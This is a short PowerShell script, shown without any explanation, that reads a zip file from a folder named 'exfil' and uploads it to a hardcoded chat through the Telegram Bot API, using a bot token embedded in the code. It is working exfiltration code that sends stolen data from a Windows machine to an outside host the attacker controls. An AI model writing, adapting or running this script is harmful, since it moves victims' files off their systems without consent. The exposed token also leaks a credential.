$botToken = "7331837186:AAHPnnzoQadXS_cmvvXQz7-3uFiFK1eUFm0"
$chatId = "5106263363"
$filePath = "C:\temp\exfil\exfil_data.zip"

$Url = "https://api.telegram.org/bot$botToken/sendDocument"
$PostParams = @{
    chat_id = $chatId
}

$FileContent = [System.IO.File]::ReadAllBytes($filePath)
$FileBase64 = [System.Convert]::ToBase64String($FileContent)
$Boundary = [System.Guid]::NewGuid().ToString()
$LF = "`r`n"

$BodyLines = (
    "--$Boundary",
    "Content-Disposition: form-data; name=`"chat_id`"",
    "",
    $chatId,
    "--$Boundary",
    "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $filePath -Leaf)`"",
    "Content-Type: application/octet-stream",
    "",
    [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($FileBase64)),
    "--$Boundary--"
) -join $LF

$Headers = @{
    "Content-Type" = "multipart/form-data; boundary=$Boundary"
}

Invoke-RestMethod -Uri $Url -Method Post -Headers $Headers -Body $BodyLines
